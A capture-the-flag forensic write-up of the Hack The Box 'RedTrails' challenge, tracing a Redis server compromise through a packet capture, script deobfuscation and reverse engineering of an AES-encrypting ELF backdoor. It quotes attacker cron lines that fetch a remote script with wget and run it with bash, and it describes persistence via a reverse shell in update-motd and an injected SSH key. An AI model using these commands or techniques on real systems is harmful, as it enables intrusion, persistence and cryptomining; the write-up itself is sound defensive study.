# Write-up: RedTrails (Hack The Box)

- Platform: Hack The Box
- Challenge: RedTrails
- Files: `capture.pcap`
- Tools used: `wireshark`, `bash`, `python`, `ghidra`, `xxd`

## 1. Initial Analysis (Wireshark)

I started by opening the capture in Wireshark and identified a RESP (Redis) connection from `10.10.0.15` (the attacker) to the server `10.10.0.90`.

Following the TCP stream, the attacker began with:

```text
COMMAND DOCS
INFO
HGETALL users_table
```

This was used to dump all users' emails and passwords.

The server's response to the last command contained the first flag part. Two more parts were still missing.

## 2. The Malicious Bash Script

The attacker added the following cron job:

```bash
* * * * * wget -O VgLy8V0Zxo 'http://files.pypi-install.com/packages/VgLy8V0Zxo' && bash VgLy8V0Zxo
```

The URL itself was not reachable, so I went back to the packets. The server had downloaded `VgLy8V0Zxo` over HTTP, so I exported it via `File → Export Objects → HTTP`.

The file contained two things:

- an obfuscated command
- a reversed Base64 string

### Deobfuscation

I reversed the Base64 text with a small Python script:

```python
print(base64_text[::-1])
```

After decoding, it revealed another layer of obfuscated Base64 commands.

Decoding that layer showed the script's purpose:

- Run a normal reverse shell command and write it to `/etc/update-motd.d/00-header`, so it executes every time the server is accessed.
- Append the attacker's SSH public key to `~/.ssh/authorized_keys`.

The second flag part was found here.

## 3. Encrypted Traffic in the Second RESP Stream

Back in Wireshark, I opened `tcp.stream eq 2` (another RESP connection). The server returned unusual responses such as:

```text
394810bbd00d01baa64e1da...
```

These came after the attacker ran:

```bash
wget --no-check-certificate -O gezsdSC8i3 'https://files.pypi-install.com/packages/gezsdSC8i3' && bash gezsdSC8i3
```

Conclusion: the downloaded file runs commands on the server and returns the output encrypted to the attacker.

## 4. Extracting the ELF Binary (PSYNC)

In `tcp.stream eq 6`, I found:

```text
*3
$5
PSYNC
$40
86d03325daa4b4813f5f1ef94c0bc4839cf664b5
$1
1
```

This means the replica asks the master to continue syncing from replication ID `86d0...` at offset `1`.

The master has two options:

- `+CONTINUE`: resend only the missing data.
- `+FULLRESYNC`: send the full snapshot.

Here the server chose `+FULLRESYNC`, so the whole file was transferred.

The data begins with `.ELF`, meaning it is an Executable and Linkable Format file. The next step is to extract it and reverse engineer it with Ghidra, IDA, etc.

### Extraction

Extracting directly from the TCP stream may not work. A better approach is to extract from packet `110`:

1. Expand `RESP → Bulk String → Value`.
2. Right-click → `Copy → ...as Hex Stream`.
3. Paste it into a file and convert it:

```bash
cat file | xxd -r -p > file2.elf && file file2.elf
```

Expected output:

```text
ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, stripped
```

## 5. Reverse Engineering

Opening the binary in a decompiler, I found a function named `DoCommand`. It contains two interesting variables:

```c
local_1098 = "h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz";   // 32 bytes → AES-256 key
local_1090 = "YDP7ECjzuV7sagMN";                    // 16 bytes → IV
```

Following their usage, both are passed to the encryption routine. A few lines later, the call below confirms the algorithm:

```c
cipher = EVP_aes_256_cbc();
```

So the encryption is AES-256-CBC.

## 6. Decrypting the Traffic

With the key and IV, I could decrypt the encrypted responses from `tcp.stream eq 2`:

```bash
python3 aes_dec.py
```

Example input:

```text
Enter encrypted hex: adb4bb64d395eff7d093f5fba5481ab0e71be15728b38130a6d4276b8b5bdb2f
```

Decrypted output:

```text
[+] Decrypted output:
removed './x10SPFHN.so'
```

Another example:

```text
Enter encrypted hex: a64e32bc245f94d0b290094eafdb80d17b397747a91029f60788e2432f918f3f...
[+] Decrypted output:
Linux redis-master 5.15.0-88-generic #98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023 x86_64 GNU/Linux
```

Another example:

```text
Enter encrypted hex: 394810bbd00d01baa64e1da65ad18dcbe7d1ca585d429847e0fe1c4f76ff3cf4...
[+] Decrypted output:
--- Installing ethminer ---
--- Enabling automatically startup ---

--- Setting env ---
ETHMINER_PATH=/tmp/ethminer
HOSTNAME=redis-master
REDIS_DOWNLOAD_SHA=5c76d990a1b1c5f949bcd1eed90d0c8a4f70369bdbdcb40288c561ddf88967a4
PWD=/data
HOME=/root
REDIS_VERSION=7.2.1
REDIS_DOWNLOAD_URL=http://download.redis.io/releases/redis-7.2.1.tar.gz
SHLVL=4
FLAG_PART=###########
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env

--- Success! ---
```

The third flag part was in the `FLAG_PART` environment variable.

## Summary

| Stage | Finding |
| --- | --- |
| `HGETALL users_table` | Flag part 1 |
| Deobfuscated bash script | Flag part 2 |
| AES-256-CBC decrypted output | Flag part 3 |
